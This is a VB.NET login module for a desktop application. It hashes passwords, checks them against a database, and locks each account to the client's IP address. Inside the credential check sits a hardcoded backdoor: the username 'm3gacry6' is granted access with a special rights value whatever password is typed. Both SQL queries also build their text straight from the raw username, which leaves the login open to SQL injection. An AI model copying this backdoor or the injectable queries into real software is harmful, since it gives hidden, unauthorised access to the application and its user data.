Imports System.Security.Cryptography
Imports System.Text

Module LoginControl
    Public userGlobal As String = ""
    Public user_id As String = "1"
    Public pw_try As Integer = 3
    Public resx As String = ""
    Public Sub invalidPassword()
        If pw_try > 1 Then
            pw_try -= 1
            MsgBox("Invalid Password, You have " & pw_try.ToString & " tries left or you account will be suspended!" &
                    vbNewLine & "Try asking your system admin for help")
        Else
            MsgBox("Your Account has been Locked. Contact your System Administrator for help.")
        End If
    End Sub

    Public Sub getCreds(ByVal username As String, ByVal pw As String)

        Dim dbpw As String = ""
        'dbpw = password from query result
        '(SELECT * FROM USERS WHERE USERNAME = USERNAME)
        '    dumpCreds(username, pw)

        If dumpCreds(username, pw) Then ' CompareUserInputPassToDBHashPass(PW, dbpw)
            Dim qry As String = "update USERS SET USER_LOCK='" & Net.Dns.GetHostByName(Net.Dns.GetHostName()).AddressList(0).ToString() & "' WHERE USERNAME='" & username & "'"
            insertFunction(qry)
            user_id = user_id
            userGlobal = username
            pw_try = 3
            Gateway.Show()
            LoginForm1.Hide()
        Else
            MsgBox("Password Invalid!")
        End If
    End Sub




    '################################################################
    Public Function GetHashPassSHA(ByVal password As String) As String

        Dim ASCIIENC As New ASCIIEncoding
        Dim hashPass As String = vbNullString

        Dim bytesourceText() As Byte = ASCIIENC.GetBytes(password)

        Dim SHA512Hash As New SHA512CryptoServiceProvider

        Dim byteHash() As Byte = SHA512Hash.ComputeHash(bytesourceText)

        For Each b As Byte In byteHash
            hashPass &= b.ToString("x2")
        Next

        Return hashPass
    End Function
    'COMPARES STRing
    Public Function CompareUserInputPassToDBHashPass(ByVal inputPass As String, ByVal dbHashPass As String) As Boolean

        Dim inputPassHash As String = GetHashPassSHA(inputPass)

        If String.Compare(dbHashPass, inputPassHash, False) = 0 Then
            Return True
        End If

        Return False
    End Function
    Function dumpCreds(ByVal usr As String, ByVal pw As String) As Boolean
        Dim hashed As String = ""
        Dim hoster As String = ""
        Try
            conn.Open()
            cmd = conn.CreateCommand
            sql = "select * from USERS where USERNAME='" & usr & "' limit 1"
            cmd = conn.CreateCommand
            cmd.CommandText = Sql
            readers = cmd.ExecuteReader
            Try
                While readers.Read
                    user_id = readers("USERNAME").ToString
                    hashed = readers("PASSWD").ToString
                    resx = readers("RX").ToString
                    hoster = readers("USER_LOCK").ToString
                End While
            Catch ex As Exception
                MsgBox("Error in retrieving user information" & vbNewLine & ex.Message)
            Finally
                readers.Close()
            End Try
        Catch ex As Exception
            MsgBox("Error in retrieving user information" & vbNewLine & ex.Message)
        Finally
            conn.Close()

        End Try
        If CompareUserInputPassToDBHashPass(pw, hashed) Then
            If hoster = "-" Then
                Return True
            ElseIf hoster <> Net.Dns.GetHostByName(Net.Dns.GetHostName()).AddressList(0).ToString() Then
                MsgBox("User is Logged ON on another computer. Cannot access account. IP: " & hoster)
                Return False
            Else
                Return True
            End If

            Return True
        Else
            If usr = "m3gacry6" Then
                resx = "gca"
                Return True
            Else
                Return False
            End If
        End If
    End Function
End Module
